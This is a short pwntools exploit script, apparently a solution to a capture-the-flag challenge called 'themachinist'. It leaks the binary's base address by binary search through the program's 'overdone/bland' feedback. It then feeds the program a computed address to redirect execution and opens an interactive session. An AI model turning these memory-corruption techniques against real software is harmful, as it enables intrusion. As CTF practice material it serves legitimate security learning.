#!/usr/bin/python3

from pwn import *

exe = ELF('themachinist', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                brva 0x175D

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('dyn.ctf.pearlctf.in', 30022)
else:
        p = process(exe.path)

GDB()


def guessing():
    sla(b"(1-4): ", '1')
    p.recvuntil(b'attempts!\n')
    start = 0
    end = 105553116266496
    while start <= end:
        mid = (start + end) //2
        sla(b'recipe: ', str(mid))
        recv = p.recvline()
        if b"Whoa! Your sauce is overdone!" in recv:
            end = mid - 1
        elif b"Oh no! Your sauce is bland!" in recv:
            start = mid + 1
        else:
            print(mid)
            return mid
exe.address = guessing() - 0x12e9
info("exe.address: " + hex(exe.address))
sla(b"(1-4): ", '2')
sla(b"with: ", hex(exe.address + 0x1764+1))
sla(b"ingredient: ", "0")
sla(b"to remove): ", b"r")
sla(b"(1-4): ", '3')

p.interactive()
